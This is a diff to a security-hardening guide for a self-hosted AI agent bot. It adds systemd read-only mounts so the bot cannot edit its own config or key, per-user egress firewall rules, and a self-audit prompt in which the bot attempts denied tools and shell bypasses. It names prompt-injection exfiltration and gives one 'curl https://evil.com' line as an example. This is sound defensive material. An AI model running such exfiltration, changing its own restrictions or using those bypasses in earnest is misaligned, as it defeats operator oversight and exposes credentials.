@@ -248,6 +248,44 @@ LimitNOFILE=65536
 WantedBy=multi-user.target
 ```
 
+#### 1.2.1 Drop-in Overrides for Sensitive Files
+
+The unit file above grants `ReadWritePaths=/home/openclaw/.openclaw` because the bot needs to write to its memory database, pipeline, and workspace. But specific files within that directory — the main config and lattice identity key — should be read-only to the bot process. A prompt injection that gains shell access could otherwise modify `openclaw.json` to remove the tool deny list or exfiltrate the lattice private key.
+
+**The solution:** Use a systemd drop-in file with `ReadOnlyPaths` for specific files. Systemd resolves path conflicts by specificity — a `ReadOnlyPaths` for a specific file overrides a `ReadWritePaths` on its parent directory.
+
+```ini
+# /etc/systemd/system/openclaw.service.d/hardening.conf
+[Service]
+# Protect config and lattice key from bot self-modification.
+# More specific paths override ReadWritePaths=/home/openclaw/.openclaw
+ReadOnlyPaths=/home/openclaw/.openclaw/openclaw.json
+ReadOnlyPaths=/home/openclaw/.openclaw/workspace/lattice/identity.json
+```
+
+**Why a drop-in instead of editing the main unit?**
+- Drop-ins survive package updates that overwrite the main service file
+- Your customizations are visible and separate from upstream defaults
+- `systemctl cat openclaw.service` shows both the base unit and all drop-ins
+
+**What this means in practice:**
+- The bot process sees `openclaw.json` as read-only at the kernel level — `chmod`, `echo >>`, `mv`-and-replace all fail
+- When *you* SSH in as the `openclaw` user, you're not inside the systemd mount namespace — you can edit the config normally
+- The memory database, pipeline, and workspace remain writable (the bot needs them to function)
+
+After creating the drop-in:
+
+```bash
+sudo systemctl daemon-reload
+sudo systemctl restart openclaw
+
+# Verify the mount is active:
+cat /proc/$(pgrep -f "openclaw gateway")/mountinfo | grep openclaw.json
+# Should show "ro" (read-only) mount
+```
+
+**Companion monitoring:** Add a daily cron job that verifies `NoNewPrivileges=true` and the drop-in file still exist — OpenClaw auto-updates could modify the systemd unit. See §17 for a monitoring script template.
+
 ### 1.3 The MemoryDenyWriteExecute Problem
 
 The GUIDE currently sets `MemoryDenyWriteExecute=true`. This is technically incorrect for Node.js:
@@ -851,6 +889,44 @@ sudo ufw status verbose
 ```
 
 **Practical recommendation:** Start with Option A (allow all outbound HTTPS) for simplicity. This still blocks exfiltration over non-standard ports (SSH tunnels, raw TCP, UDP exfil) while being maintainable. Tighten to IP-specific rules if your threat model demands it, but accept the maintenance burden of updating IPs when providers change CDN endpoints.
+
+**Option C: Per-user egress filtering via `before.rules` (recommended)**
+
+Options A and B use `ufw default deny outgoing`, which restricts *all* users on the VPS — including your SSH sessions and system package updates. Option C restricts only the `openclaw` user (uid 1001) by adding rules to `/etc/ufw/before.rules` that use the `-m owner --uid-owner` match. Your SSH, `apt update`, and other users are completely unaffected.
+
+Add these lines to `/etc/ufw/before.rules`, just before the `COMMIT` line:
+
+```
+# --- OpenClaw egress filtering (uid 1001) ---
+# Allow new outbound DNS (needed for domain resolution)
+-A ufw-before-output -p udp --dport 53 -m owner --uid-owner 1001 -j ACCEPT
+# Allow new outbound HTTPS (API calls: Anthropic, Telegram, OpenRouter, etc.)
+-A ufw-before-output -p tcp --dport 443 -m owner --uid-owner 1001 -j ACCEPT
+# Log and drop all other new outbound from openclaw
+-A ufw-before-output -m owner --uid-owner 1001 -m conntrack --ctstate NEW -j LOG --log-prefix "[UFW-OPENCLAW-BLOCK] " --log-level 4
+-A ufw-before-output -m owner --uid-owner 1001 -m conntrack --ctstate NEW -j DROP
+# --- End OpenClaw egress filtering ---
+```
+
+**Why this works:** UFW's existing loopback rule (`-A ufw-before-output -o lo -j ACCEPT`) and established-connection rule (`-m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT`) fire before these user-specific rules, so gateway traffic on `127.0.0.1:18789` and return traffic on existing connections pass through normally. Only *new* outbound connections from uid 1001 are filtered.
+
+**When to use Option C over A/B:**
+- Multi-user VPS where other users need unrestricted outbound
+- You want egress filtering without disrupting `apt update`, `pip install`, or SSH
+- You're willing to trade domain-level precision for operational simplicity
+
+**Limitation:** Option C allows all HTTPS (port 443) destinations. A prompt injection exfiltrating data via `curl https://evil.com` still succeeds. For domain-level filtering, you'd need a transparent proxy (squid with SSL bump) or eBPF-based filtering — both significantly more complex.
+
+After adding the rules:
+
+```bash
+sudo ufw reload
+# Verify from the openclaw user:
+curl -s -o /dev/null -w "HTTPS: %{http_code}\n" https://api.anthropic.com  # Should work
+curl -s -o /dev/null -w "HTTP: %{http_code}\n" --connect-timeout 5 http://httpbin.org/get  # Should timeout
+# Check blocked attempts:
+journalctl -k | grep UFW-OPENCLAW-BLOCK
+```
 
 ### 5.3 Fail2ban Tuning
 
@@ -2104,6 +2180,39 @@ These are listed for version pinning awareness, attack pattern understanding, an
 **Pattern:** All three CVEs were patched in the same release (v2026.1.29), suggesting a coordinated security audit. The command injection vulnerabilities indicate the tool execution layer was the weakest point. The WebSocket auth bypass (CVE-2026-25253) is the most concerning — it suggests the gateway auth model was designed for convenience, not security.
 
 **Always use OpenClaw >= v2026.1.29.** Run `openclaw --version` to verify.
+
+### 17.4 Self-Audit Methodology
+
+**The concept:** Send the bot a structured audit prompt that instructs it to *test* its own capabilities — not just read config, but actually attempt each operation and report whether it succeeded, failed, or found a bypass. This surfaces gaps between what you *think* is restricted and what's *actually* restricted at runtime.
+
+**The prompt template** lives at `src/audit/self-audit-prompt.md`. Send it via Telegram or pipeline. It tests 8 categories:
+
+| Category | What It Tests | Why It Matters |
+|----------|--------------|----------------|
+| **Shell access** | `whoami`, `id`, `sudo -l`, `/tmp` write | Confirms user isolation and privilege boundaries |
+| **File system scope** | Read/write to config, home, system paths | Maps actual blast radius of code execution |
+| **Network access** | Outbound HTTPS, gateway, port visibility, public IP | Verifies egress filtering is working |
+| **Denied tool bypass** | Attempt denied tools, then achieve same goals via shell | Exposes the shell bypass vector (§7.3 in GUIDE) |
+| **Process visibility** | Process listing, signal capability | Checks cross-process isolation |
+| **Sensitive files** | Config, lattice keys, memory DB, pipeline messages | Inventories credential exposure within scope |
+| **Config modification** | Direct write attempts to config, workspace | Tests ReadOnlyPaths enforcement |
+| **Cron/scheduling** | Crontab access, cron tool availability | Confirms bot can't self-schedule |
+
+**How to use:**
+
+1. Send the audit prompt to the bot (Telegram DM or pipeline inbox)
+2. Review the results — look for PASS on things that should be DENIED, and BYPASSED on anything
+3. Cross-reference against your expected security posture
+4. Re-run after any config change, OpenClaw update, or systemd modification
+
+**Expected baseline results** (with recommended hardening from this document):
+- Shell access: PASS (intended — `exec.security: "full"`)
+- Sudo: DENIED (`NoNewPrivileges=true`)
+- Config write via shell: DENIED (ReadOnlyPaths)
+- Network to arbitrary HTTP: DENIED (egress filtering)
+- Sensitive file read: PASS for own scope (accepted risk — bot needs its own config/memory)
+
+**When to re-audit:** After every OpenClaw version update, after any systemd unit change, and quarterly as a routine check.
 
 ---
 
